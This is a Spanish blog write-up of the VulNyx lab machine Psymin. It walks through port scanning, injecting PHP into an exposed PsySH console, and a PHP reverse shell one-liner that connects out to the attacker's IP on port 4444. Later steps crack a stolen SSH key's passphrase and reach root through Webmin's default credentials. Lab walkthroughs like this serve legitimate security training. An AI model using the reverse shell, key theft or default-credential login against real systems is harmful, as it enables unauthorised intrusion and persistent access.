---
title: 'Psymin'
description: 'Resolución de la máquina Psymin de Vulnyx.'
pubDate: 'Nov 10 2024'
heroImage: '/images/machines/psymin/psymin-hero.webp'
---

Bienvenidos a la resolución de la máquina **Psymin** de la plataforma VulNyx, una máquina sencilla e interesante. Es mi primer writeup y más que mostrar la solución de manera directa quiero mostrar mi enfoque y el por qué de mis decisiones.

![psymin machine info](/images/machines/psymin/psymin.webp)
## Enumeración

Primero veremos los puertos que estan abiertos y que servicios están expuestos:

```bash
sudo nmap -p- -sS -Pn -n --open --min-rate 5000 10.0.2.10 -vvv -oG allPorts
...
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3000/tcp open  ppp     syn-ack ttl 64
...
```

Ahora usaremos scripts básicos de reconocimiento para los puertos abiertos:

```bash
nmap -p22,80,3000 -sCV 10.0.2.10 -vvv -oN targeted

# Nmap 7.95 scan initiated Thu Nov  7 19:23:26 2024 as: nmap -p22,80,3000 -sCV -vvv -oN targeted 10.0.2.10
Nmap scan report for 10.0.2.10
Host is up, received syn-ack (0.00052s latency).
Scanned at 2024-11-07 19:23:32 -05 for 153s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzUvGOaZF4gJoYBGR4NrMZOj32x98uVDUQ0dY0RENRdIyokD8RvJG8g9g71aoh/20m4mcEEdSyp+eE9ABu1kwk=
|   256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPrNZ9AQg+cgX4w0wabsDTAVeo9/VWThsF5efc2OzsFo
80/tcp   open  http    syn-ack nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.22.1
3000/tcp open  ppp?    syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     ^@^L^@^@^P^@^@^@^@^@^@^@^@^@Psy Shell v0.12.4 (PHP 8.2.20 
|     cli) by Justin Hileman
|     OPTIONS / RTSP/1.0
|   DNSVersionBindReqTCP: 
|     ^CPsy Shell v0.12.4 (PHP 8.2.20 
|     cli) by Justin Hileman
|   GenericLines, NULL: 
|     Psy Shell v0.12.4 (PHP 8.2.20 
...
```

## Servicios Web

Los servicios que más me llaman la atención son `HTTP` en el puerto 80 y 3000. Digo que el puerto 3000 ejecuta un servicio web ya que veo en el resultado de los scripts de reconocimiento varias cabeceras HTTP como `GET / HTTP/1.0` u `OPTIONS / HTTP/1.0`.

![port 80](/images/machines/psymin/port80.webp)

Revisando el puerto 80 no encuentro nada interesante ni en el código fuente o haciendo _fuzzing_ de directorios o archivos. Tambien revisé si existián los archivos `robots.txt` o `sitemap.xml` sin encontrar ninguno de estos.

![port 3000](/images/machines/psymin/port3000.webp)

Investigando un poco, veo que [psysh](https://psysh.org/) es un debugger con consola interactiva para PHP así que hago una prueba ejecutando código arbitrario PHP cambiando el método de solicitud ya que veo que es una entrada en la sesión de **Psy Shell**.

Usando **burpsuite** cambiamos el método de solicitud por código PHP a ver qué pasa, enviamos la solicitud al _repeater_ para poder modificar nuestra solicitud.

![Initial Burp Request](/images/machines/psymin/burpRequest.webp)

Como vimos en nuestro navegador los campos que se ejecutan como "comandos" en **psy shell** son el método `GET / HTTP/1.1` y los encabezados `User-Agent` y `accept`, no cambiaría `host` debido a que la solicitud ya no se haría a este equipo.

Voy a reemplazar la linea del método de solicitud por código arbitrario PHP como el siguiente:

```php
// Linea original
GET / HTTP/1.1

// Código arbitrario
$fecha="date";
```

![arbitrary php](/images/machines/psymin/php-arbitrary-code.webp)

Ahora que sé que puedo ejecutar código PHP quiero obtener una reverse shell la cual generaré con [Reverse Shell Generator](https://www.revshells.com/), existen muchas opciones para generar una reverse shell con PHP, pero algunas funciones no se pueden ejecutar, la opción que me funcionó fue con `proc_open`.

```php
$sock=fsockopen("10.0.2.9",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

Antes de enviar la solicitud con este código PHP, pondremos a la escucha el puerto 4444 que definimos en `fsockopen` y cuya IP es la de nuestra máquina atacante.

```bash
nc -nlvp 4444
```

Ahora enviamos la solicitud con **burpsuite** y obtendremos una reverse shell.

![reverse shell php](/images/machines/psymin/reverse-php.webp)

Una vez recibida la conexión hacemos un [tratamiento de la tty](https://invertebr4do.github.io/tratamiento-de-tty/) y tendremos la primer _flag_ en `$HOME/user.txt`.

```bash
cat $HOME/user.txt
e12853......
```

Ahora quiero mantener acceso al usuario alfred y en su `$HOME` veo que tiene el directorio `.ssh`  con su `id_rsa`, la copio de manera local y lo uso para acceder a la máquina por ssh.

> Es importante que `id_rsa` tenga los permisos 600, puedes hacerlo con `chmod 600 id_rsa`.

```bash
ssh alfred@10.0.2.10 -i id_rsa
Enter passphrase for key 'id_rsa':
```

Me pide una clave para acceder, entonces vamos a crear un hash con [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py) y ese hash posteriormente lo crackearemos con [John The Reaper](https://github.com/openwall/john).

```bash
ssh2john.py id_rsa > alfred.hash
john --wordlist=/usr/share/rockyou.txt --fomat=SSH alfred.hash

# terminando el comando anterior
john --show alfred.hash
id_rsa:alfredo
```

La _passphrase_ de la clave privada contenida en `id_rsa` es `alfredo`, entonces ahora podemos conectarnos con el `id_rsa` y proporcionando la clave `alfredo`.

```bash
ssh alfred@10.0.2.10 -i id_rsa
```

Ahora tenemos acceso permanente a este usuario.

## Escalada de privilegios

Podemos listar el archivo `/etc/passwd` para ver que otros usuarios existen, pero no veo ninguno, así que buscamos convertirnos en **root**.

Lo primero que se me ocurre al escalar privilegios son tres cosas. La primera es ver si tengo algún binario o comando que pueda ejecutar como otro usuario y moverme lateral o verticalmente con `find` o `sudo`.

```bash
find / -perm -4000 2>/dev/null
sudo -l
```

No obtengo buenos resultados con `find` y el comando `sudo` no existe.

En segundo lugar busco procesos que se estén ejecutando en segundo plano y/o de manera periodica.

```bash
#!/bin/bash

# procmon script de s4vitar
old_process=$(ps -eo command)

while true; do
        new_process=$(ps -eo command)
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\<\>]" | grep -v -E "command|procmon"
        old_process=$new_process
done
```

No encuento nada interesante (asumo que no existen tareas cron), así que por último veo qué servicios existen y se están ejecutando.

```bash
systemctl --type=service | grep "running"
```

No veo servicios fuera de lo común a excepción de `webmin.service`. Busco en internet qué hace este servicio y veo que es una herramienta de configuracion o administracíon de un sistema, al cual se puede acceder mediante **http**. Leyendo la documentación veo que se ejecuta en el puerto `10000`. 

Ahora veo qué puertos están en escucha, pero no están expuestos.

```bash
ss -tunlp
```

Noto que un puerto TCP está a la escucha de manera local  `127.0.0.1:10000`, ahora haremos un _port fordwarding_ hacia nuestro equipo y veremos si efectivamente es `webmin.service`.

```bash
ssh -L 10000:127.0.0.1:10000 alfred@10.0.2.10 -i id_rsa
```

Ahora desde mi navegador ingreso la url `localhost:10000` y efectivamente es webmin.

![webmin login](/images/machines/psymin/webmin-login.webp)

Probaremos las credenciales por defecto en primer lugar y si no, veremos qué hacer con otras credenciales. Revisando en el proceso de instalación, para [acceder al panel de webmin](https://www.liquidweb.com/blog/webmin-ubuntu/#Access%20the%20Webmin%20Panel) al finalizar la instalación, las credenciales por defecto son `root:root`. Efectivamente, estas son las credenciales e ingresamos al panel.

Como nos permite administrar un equipo remoto mediante una interfáz gráfica, dentro de nuestro panel de trabajo existe una terminal interactiva que nos permite ingresar comandos en el equipo remoto.

La terminal se ubica en **Tools > Terminal** y al acceder ya somos el usuario **root**. Finalmente podemos leer el archivo `$HOME/root.txt`.

```bash
cat /root/root.txt
8968.....
```

Si quieres tener un acceso permanente, puedes aprovechar el `id_rsa` del usuario root y usarlo para acceder al equipo sin proporcionar contraseña.

Y bueno jeje, eso fué la máquina **Psymin**, espero les haya gustado este _writeup_ y si tienes alguna recomendación, sugerencia, correción o algo que quieras decirme ve a puedes escribirme cualquiera de mis redes sociales en [contacto](/contact).
